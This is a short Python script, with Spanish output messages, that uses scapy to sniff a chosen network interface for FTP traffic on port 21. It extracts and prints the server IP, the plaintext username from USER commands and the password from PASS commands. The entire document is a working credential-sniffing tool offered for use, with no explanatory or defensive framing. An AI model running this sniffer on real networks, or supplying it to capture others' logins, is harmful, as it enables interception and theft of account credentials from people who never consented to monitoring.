#!/usr/bin/env python
# _*_ coding: utf8 _*_

from scapy.all import *
import argparse

parse = argparse.ArgumentParser()
parse.add_argument("-i","--interface",help="Interfaz de red..")
parse = parse.parse_args()

def sniffer_ftp(pkt):
	if pkt[TCP].dport == 21:
		data = pkt.sprintf("%Raw.load%")
		if "USER" in data:
			print("FTP IP: "+ pkt[IP].dst)
			data = data.split(" ")
			data = data[1]
			print("USUARIO FTP: " + data)
		elif "PASS" in data:
			data = data.split(" ")
			data = data[1]
			print("CONTRASEÑA: " + data)

def main():
	if parse.interface:
		print("Sniffeando ...")
		sniff(iface=parse.interface, filter="tcp and port 21", prn=sniffer_ftp)
	else:
		print("Necesito una interfaz de red..")

if __name__ == "__main__":
	main()